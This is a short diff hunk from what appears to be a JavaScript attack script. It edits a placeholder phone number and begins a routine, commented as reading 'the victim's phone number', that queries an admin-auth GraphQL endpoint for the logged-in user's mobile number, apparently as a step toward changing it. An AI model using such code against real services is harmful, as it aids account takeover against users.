@@ -41,7 +41,7 @@
 
     (async () => {
       // 1) Read the victim’s phone number
-      let oldN = '+33600000002';
+      let oldN = '+33600000003';
       const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
       if (whoami.status === 200 && whoami.json.data?.user?.mobilePhoneNumber) {
         oldN = whoami.json.data.user.mobilePhoneNumber;
